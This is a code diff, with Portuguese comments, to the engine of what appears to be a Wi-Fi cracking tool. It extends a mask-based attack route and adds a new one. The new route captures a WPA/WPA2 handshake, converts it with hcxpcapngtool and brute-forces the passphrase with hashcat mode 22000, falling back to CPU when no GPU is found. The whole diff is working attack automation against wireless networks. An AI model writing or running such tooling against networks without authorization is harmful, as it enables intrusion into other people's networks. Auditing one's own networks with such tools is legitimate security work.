@@ -408,14 +408,25 @@ class Engine:
     # 6. rotas de ataque
     # ------------------------------------------------------------------
 
-    def rota_mascara(self, tamanho, prefixo, tipo_placeholder):
-        self.log("--- Rota A: ataque de máscara (prefixo conhecido) ---")
-        restante = tamanho - len(prefixo)
-        if restante < 0:
-            self.log("Prefixo maior que o tamanho total. Abortando rota de máscara.")
-            return False
+    def rota_mascara(self, tamanho=None, prefixo="", tipo_placeholder="", mascara=None):
+        self.log("--- Rota A: ataque de máscara ---")
+        if mascara:
+            # Máscara crunch completa: parte conhecida em qualquer posição.
+            # Tamanho = nº de posições de saída (\X escapado conta como 1).
+            tamanho = len(mascara.replace("\\", ""))
+        else:
+            if tamanho is None:
+                self.log("Faltam parâmetros da máscara. Abortando rota de máscara.")
+                return False
+            restante = tamanho - len(prefixo)
+            if restante < 0:
+                self.log("Prefixo maior que o tamanho total. Abortando rota de máscara.")
+                return False
+            mascara = prefixo + (tipo_placeholder * restante)
 
-        mascara = prefixo + (tipo_placeholder * restante)
+        if tamanho < 8:
+            self.log(f"Aviso: WPA/WPA2 exige 8+ caracteres — máscara de {tamanho} dificilmente casa.")
+
         if not self.capturar_handshake():
             return False
 
@@ -435,11 +446,67 @@ class Engine:
         m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", aircrack.stdout)
         if m:
             self.senha = m.group(1)
-            self.rota_usada = "Máscara (prefixo conhecido)"
+            self.rota_usada = "Máscara (crunch)"
             self.log(f"Senha encontrada via máscara: {self.senha}")
             return True
 
         self.log("Máscara não encontrou a senha com os parâmetros informados.")
+        return False
+
+    def rota_mascara_hashcat(self, mascara, custom=""):
+        """Variante da Rota A com coringas do hashcat (-a 3): ?l ?u ?d ?s e
+        ?a = QUALQUER caractere imprimível — para posições cuja classe o
+        usuário não sabe (o crunch não tem coringa 'qualquer'). Usa GPU; cai
+        para CPU com --force se nenhum dispositivo for detectado."""
+        self.log("--- Rota A (hashcat -a 3): máscara com coringas do hashcat ---")
+        if not mascara:
+            self.log("Máscara vazia. Abortando.")
+            return False
+        if not self.capturar_handshake():
+            return False
+
+        cap = self._ultimo_cap()
+        if not _tool_existe("hcxpcapngtool"):
+            self.log("hcxpcapngtool não encontrado — não dá pra converter a captura pro hashcat.")
+            return False
+
+        hashfile = WORKDIR / "hash_mask_gui.hc22000"
+        hashfile.unlink(missing_ok=True)
+        self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])
+        if not hashfile.exists() or hashfile.stat().st_size == 0:
+            self.log("Não foi possível extrair hash da captura (handshake pode estar incompleto).")
+            return False
+
+        found = WORKDIR / "hashcat_mask_found_gui.txt"
+        found.unlink(missing_ok=True)
+
+        def _cmd(forcar):
+            c = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
+            if custom:
+                c += ["-1", custom]
+            if forcar:
+                c += ["--force"]
+            c += [mascara, "--potfile-disable", "-o", str(found)]
+            return c
+
+        self.log(f"Rodando hashcat -a 3 com máscara '{mascara}' (pode demorar conforme o espaço de busca)...")
+        r = self.run(_cmd(False), timeout=3600)
+        saida = (r.stdout or "") + (r.stderr or "")
+        if (not found.exists() or found.stat().st_size == 0) and re.search(
+            r"no devices? (found|left)", saida, re.I
+        ):
+            self.log("Nenhum dispositivo detectado — repetindo com --force (CPU, mais lento)...")
+            self.run(_cmd(True), timeout=3600)
+
+        if found.exists() and found.stat().st_size > 0:
+            linhas = found.read_text().strip().splitlines()
+            if linhas:
+                self.senha = linhas[-1].split(":", 1)[-1]
+                self.rota_usada = "Máscara (hashcat -a 3)"
+                self.log(f"Senha encontrada via máscara hashcat: {self.senha}")
+                return True
+
+        self.log("Máscara hashcat não encontrou a senha com os parâmetros informados.")
         return False
 
     def rota_wps(self):
@@ -656,7 +723,15 @@ class Engine:
 
         try:
             if mascara:
-                if self.rota_mascara(mascara["tamanho"], mascara["prefixo"], mascara["tipo"]):
+                if mascara.get("hashcat"):
+                    ok = self.rota_mascara_hashcat(mascara["hashcat"], mascara.get("custom", ""))
+                elif mascara.get("mascara"):
+                    ok = self.rota_mascara(mascara=mascara["mascara"])
+                else:
+                    ok = self.rota_mascara(
+                        mascara.get("tamanho"), mascara.get("prefixo", ""), mascara.get("tipo", "")
+                    )
+                if ok:
                     return True
                 self.log("Rota de máscara não teve sucesso. Seguindo para as próximas rotas.")
 
